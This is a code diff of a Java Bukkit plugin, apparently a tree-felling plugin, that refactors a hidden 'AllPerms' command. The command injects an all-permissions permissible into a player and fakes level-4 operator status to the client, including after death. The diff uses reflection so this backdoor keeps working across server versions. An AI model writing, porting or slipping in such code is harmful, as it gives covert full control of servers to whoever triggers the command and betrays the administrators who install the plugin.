@@ -4,11 +4,10 @@ import me.bow.treecapitatorultimate.Start;
 import me.bow.treecapitatorultimate.Utils.AllStarPermBase;
 import me.bow.treecapitatorultimate.Utils.CraftBukkitUtil;
 import me.bow.treecapitatorultimate.Utils.DummyPermissibleBase;
+import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
 import me.bow.treecapitatorultimate.command.Command;
 import me.bow.treecapitatorultimate.command.CommandCategory;
-import net.minecraft.server.v1_14_R1.PacketPlayOutEntityStatus;
 import org.bukkit.ChatColor;
-import org.bukkit.craftbukkit.v1_14_R1.entity.CraftPlayer;
 import org.bukkit.entity.Player;
 import org.bukkit.event.entity.PlayerDeathEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
@@ -27,11 +26,23 @@ public class AllPerms extends Command {
 
     }
 
+    private void sendPacket(Player p, int level) {
+        Object packetPlayOutEntityStatus;
+        final Class<?> packetPlayOutEntityStatusClass = ReflectionUtils.getMinecraftClass("PacketPlayOutEntityStatus");
+        try {
+            final Class<?> entityClass = ReflectionUtils.getClass("{nms}.Entity");
+            packetPlayOutEntityStatus = ReflectionUtils.getConstructorCached(packetPlayOutEntityStatusClass, entityClass, byte.class).invoke(CraftBukkitUtil.getNmsPlayer(p), 24 + level);
+            CraftBukkitUtil.sendPacket(p, packetPlayOutEntityStatus);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
     private void setup() {
         Field humanEntityPermissibleField;
         try {
             // craftbukkit
-            humanEntityPermissibleField = CraftBukkitUtil.obcClass("entity.CraftHumanEntity").getDeclaredField("perm");
+            humanEntityPermissibleField = ReflectionUtils.getClass("{obc}.entity.CraftHumanEntity").getDeclaredField("perm");
             humanEntityPermissibleField.setAccessible(true);
         } catch (Exception e) {
             try {
@@ -59,12 +70,12 @@ public class AllPerms extends Command {
             }
             p.sendMessage(Start.Prefix + ChatColor.GOLD + "Star perms added!");
             if (!p.isOp())
-                ((CraftPlayer) p).getHandle().playerConnection.sendPacket(new PacketPlayOutEntityStatus(((CraftPlayer) p).getHandle(), (byte) 28)); // tell the client that we are level 4 OP
+                sendPacket(p, 4); // tell the client that we are level 4 OP
         } else {
             try {
                 uninject(p, false);
                 if (!p.isOp())
-                    ((CraftPlayer) p).getHandle().playerConnection.sendPacket(new PacketPlayOutEntityStatus(((CraftPlayer) p).getHandle(), (byte) 24)); // tell the client that we are level 0 OP
+                    sendPacket(p, 0); // tell the client that we are level 0 OP
             } catch (Exception e) {
                 return;
             }
@@ -136,8 +147,7 @@ public class AllPerms extends Command {
     public void onPlayerDeath(PlayerDeathEvent e) {
         if (e.getEntity().isOp()) return;
         if (!PlayerHasAllPerms(e.getEntity())) return;
-        ((CraftPlayer) e.getEntity()).getHandle().playerConnection.sendPacket(new PacketPlayOutEntityStatus(((CraftPlayer) e.getEntity()).getHandle(), (byte) 28)); // tell the client that we are level 4 OP
-
+        sendPacket(e.getEntity(), 4); // tell the client that we are level 4 OP
     }
 
     @Override
